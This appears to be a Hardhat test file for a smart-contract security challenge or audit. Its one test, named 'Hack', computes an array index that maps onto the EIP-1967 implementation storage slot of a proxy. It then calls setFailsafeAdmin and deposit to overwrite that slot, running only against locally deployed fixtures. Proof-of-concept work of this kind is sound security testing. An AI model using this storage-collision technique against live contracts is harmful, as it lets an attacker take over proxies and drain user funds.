import { BigNumber, BigNumberish } from 'ethers'

import { Buckets, BucketsProxy, Buckets__factory, BucketsAttack } from '../typechain'
import { HARDHAT_ACCS_PUB_KEYS } from '../hardhat.config'

import { expect } from 'chai'

import { setupUser, setupUsers } from './utils/index'
import { ethers, deployments, getNamedAccounts, getUnnamedAccounts, time, network } from 'hardhat'
import { BNToNumstr } from '../gotbit-tools/hardhat/extensions/bignumber'

const nonExistentFuncSignature = 'nonExistentFunction(uint256,uint256)'

async function setup() {
  await deployments.fixture(['Buckets', 'BucketsProxy', 'BucketsAttack'])

  const contracts = {
    buckets: (await ethers.getContract('Buckets')) as Buckets,
    proxy: (await ethers.getContract('BucketsProxy')) as BucketsProxy,
    attack: (await ethers.getContract('BucketsAttack')) as BucketsAttack,
  }

  const { deployer, backend, feeAddress } = await getNamedAccounts()
  const users = await setupUsers(await getUnnamedAccounts(), contracts)
  return {
    ...contracts,
    users,
    deployer: await setupUser(deployer, contracts),
    backend: await setupUser(backend, contracts),
    feeAddress: await setupUser(feeAddress, contracts),
  }
}

const adminSlot = BigNumber.from('0xb53127684a568b3173ae13b9f8a6016e243e63b6e8ee1178d6a717850b5d6103')
const implementationSlot = BigNumber.from('0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')

const hashOfZeroSlot = BigNumber.from('0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563')

const arrayIndexToCheck = implementationSlot.sub(hashOfZeroSlot)
console.log(arrayIndexToCheck);

const arrayIndex = '0x8c233a8ef5cb28000000000000000000000000000000000000000000000000'

describe('Example unit test', () => {
  const token = BigNumber.from(10).pow(18)
  describe('Constructor', () => {
    it('Hack', async () => {
      const { buckets, proxy, attack, deployer, backend, feeAddress, users } = await setup()
      let bucketsContract = Buckets__factory.connect(proxy.address, await ethers.getSigner(users[0].address))
      console.log(await ethers.provider.getStorageAt(bucketsContract.address, implementationSlot));
      // console.log(await ethers.provider.getStorageAt(proxy.address, adminSlot));
      await users[0].proxy.setFailsafeAdmin(ethers.constants.MaxUint256)
      await bucketsContract.deposit(arrayIndexToCheck, {value: 1})
      console.log(await ethers.provider.getStorageAt(bucketsContract.address, implementationSlot));
      console.log(await bucketsContract.totalSupply());
      
      // await bucketsContract.deposit(1, {value: 5})
      // console.log(await ethers.provider.getStorageAt(proxy.address, adminSlot));
    })
  })
})
